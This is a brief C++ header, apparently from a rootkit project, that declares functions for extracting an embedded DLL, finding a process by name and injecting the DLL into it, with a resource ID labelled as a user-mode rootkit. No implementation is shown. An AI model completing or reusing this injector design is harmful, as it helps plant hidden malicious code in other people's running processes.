#ifndef INJECT_H
#define INJECT_H
#define IDR_UROOTKIT 101


void show_error(const char* msg);
std::string extract_embedded_dll();
void inject_dll(DWORD pid, const char* dllPath);
DWORD get_process_id_by_name(const wchar_t* procName);

#endif //INJECT_H
